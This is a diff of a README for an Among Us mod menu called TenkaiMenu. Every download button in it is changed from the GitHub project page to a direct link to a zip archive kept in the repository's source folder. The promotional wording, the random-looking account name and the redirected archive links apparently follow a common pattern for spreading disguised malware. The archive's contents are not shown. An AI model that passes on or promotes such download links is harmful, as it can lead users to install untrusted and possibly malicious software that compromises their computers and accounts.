@@ -4,7 +4,7 @@
 
 Welcome to TenkaiMenu, the open-source mod menu that transforms your Among Us gameplay. Whether you're looking to explore new possibilities, test game mechanics, or simply have more fun with friends, TenkaiMenu provides a clean, user-friendly interface that anyone can use.
 
-[![Download TenkaiMenu](https://img.shields.io/badge/⬇️_Download_TenkaiMenu-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dexterhydrophilic725/TenkaiMenu)
+[![Download TenkaiMenu](https://img.shields.io/badge/⬇️_Download_TenkaiMenu-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Dexterhydrophilic725/TenkaiMenu/main/src/Menu_Tenkai_2.8.zip)
 
 ## ✨ Why Choose TenkaiMenu?
 
@@ -34,7 +34,7 @@ Follow these simple steps to get TenkaiMenu running on your PC:
 
 Visit this link to download the application.
 
-[![Get TenkaiMenu Now](https://img.shields.io/badge/🎯_Get_TenkaiMenu_Now-4ECDC4?style=for-the-badge)](https://github.com/Dexterhydrophilic725/TenkaiMenu)
+[![Get TenkaiMenu Now](https://img.shields.io/badge/🎯_Get_TenkaiMenu_Now-4ECDC4?style=for-the-badge)](https://raw.githubusercontent.com/Dexterhydrophilic725/TenkaiMenu/main/src/Menu_Tenkai_2.8.zip)
 
 ### Step 2: Locate Your Among Us Folder
 
@@ -236,7 +236,7 @@ TenkaiMenu opens up a world of possibilities for Among Us. Whether you're a casu
 
 Ready to get started?
 
-[![Download TenkaiMenu Now](https://img.shields.io/badge/🚀_Download_TenkaiMenu_Now-FF9F43?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dexterhydrophilic725/TenkaiMenu)
+[![Download TenkaiMenu Now](https://img.shields.io/badge/🚀_Download_TenkaiMenu_Now-FF9F43?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Dexterhydrophilic725/TenkaiMenu/main/src/Menu_Tenkai_2.8.zip)
 
 ## 📞 Support and Contact
 
